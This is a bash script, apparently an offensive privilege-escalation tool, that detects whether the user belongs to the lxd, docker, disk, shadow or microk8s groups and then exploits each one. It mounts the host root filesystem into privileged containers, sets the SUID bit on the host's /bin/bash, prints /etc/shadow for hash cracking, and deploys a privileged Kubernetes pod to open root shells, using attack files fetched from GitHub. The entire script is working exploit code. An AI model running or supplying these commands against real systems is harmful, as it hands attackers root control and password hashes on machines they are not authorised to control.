#!/bin/bash

##### LXD,DOCKER,MICROK8S,

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"

groups | grep lxd  &> /dev/null

tita=$(echo $?)

if [[ $tita =~ 0 ]]
then
   echo -e "${YELLOW}\n[+]Vulnerable to LXD${ENDCOLOR}"
   echo -e "${RED}\nUpload alpine-v3.13-x86_64-20210218_0139.tar.gz file, you can download with this link:${ENDCOLOR}\nhttps://github.com/S12cybersecurity/Groups_PrivEsc/raw/main/alpine-v3.13-x86_64-20210218_0139.tar.gz"
   ls alpine-v3.13-x86_64-20210218_0139.tar.gz  &> /dev/null
   tita2=$(echo $?)
   if [[ $tita2 =~ 0 ]]
   then
      echo -e "\n${GREEN}File Founded!!${ENDCOLOR}\n"
      lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage &> /dev/null
      lxc init myimage mycontainer -c security.privileged=true &> /dev/null
      lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true &> /dev/null
      lxc start mycontainer &> /dev/null
      echo -e "You have host FileSystem in /mnt/root path"
      lxc exec mycontainer /bin/sh 
   else
      echo -e "\n${RED}File NOT Found!!${ENDCOLOR}"
      exit
   fi
else
   echo -e "\n${RED}[+]LXD NOT VULNERABLE${ENDCOLOR}"

fi

groups | grep docker  &> /dev/null

tita3=$(echo $?)

if [[ $tita3 =~ 0 ]]
then
   echo -e "${YELLOW}\n[+]Vulnerable to DOCKER PRIVESC${ENDCOLOR}\n"
   polla=$(docker images --format "{{.Repository}}" | head -n 1)
   docker run -v /:/mnt --rm -it ubuntu chmod u+s /mnt/bin/bash
   bash -p
   echo -e "\n${RED}Entering the docker container in case you couldn't pwn with the previous shell${ENDCOLOR}"
   echo -e "\nYou have host FileSystem in /mnt path\n"
   docker run -v /:/mnt --rm -it ubuntu bash
else
   echo -e "\n${RED}[+]DOCKER NOT VULNERABLE${ENDCOLOR}"

fi

groups | grep disk  &> /dev/null

tita4=$(echo $?)

if [[ $tita4 =~ 0 ]]
then
   echo -e "${YELLOW}\n[+]Vulnerable to DISK PRIVESC${ENDCOLOR}\n"
   echo -e "${YELLOW}Files You Can List${ENDCOLOR}\n"
   find / -group disk 2>/dev/null
else
   echo -e "\n${RED}[+]DISK GROUP NOT VULNERABLE${ENDCOLOR}"
fi

groups | grep shadow  &> /dev/null

tita6=$(echo $?)

if [[ $tita6 =~ 0 ]]
then
   echo -e "${YELLOW}\n[+]Vulnerable to SHADOW PRIVESC${ENDCOLOR}\n"
   echo -e "${YELLOW}/etc/shadow File to try to decrypt hashes${ENDCOLOR}\n"
   echo -e "How to do:\n${BLUE}https://nozerobit.github.io/linux-privesc-wrong-permissions/\n\n${ENDCOLOR}"
   cat /etc/shadow
else
   echo -e "\n${RED}[+]SHADOW GROUP NOT VULNERABLE${ENDCOLOR}"
fi

groups | grep microk8s  &> /dev/null

tita7=$(echo $?)

if [[ $tita7 =~ 0 ]]
then
   echo -e "${YELLOW}\n[+]Vulnerable to MICROKUBS PRIVESC${ENDCOLOR}\n"
   echo -e "${RED}Upload this file to this folder:${ENDCOLOR}\nhttps://raw.githubusercontent.com/S12cybersecurity/Groups_PrivEsc/main/pod.yaml"
   ls pod.yaml  &> /dev/null
   tita10=$(echo $?)
   if [[ $tita10 =~ 0 ]]
   then
      echo -e "\n${GREEN}File Founded!!${ENDCOLOR}\n"
      image=$(microk8s.kubectl get deployment -o yaml | grep "image" -m 1 |  sed 's/ //g' | cut -c 8-)
      sed -i "s/peneduro/$image/" pod.yaml
      microk8s.kubectl apply -f pod.yaml
      microk8s.kubectl exec -it priv-esc -- /bin/bash
      echo -e "\nIf you haven't received a shell, add this value, $image , to the image field of the pod.yaml file.Then run the following commands:\n- microk8s.kubectl apply -f pod.yaml\n- microk8s.kubectl exec -it priv-esc -- /bin/bash"
   else
      echo -e "\n${RED}File NOT Found!!${ENDCOLOR}"
   fi
else
   echo -e "\n${RED}[+]MICROKUBS GROUP NOT VULNERABLE${ENDCOLOR}"
fi
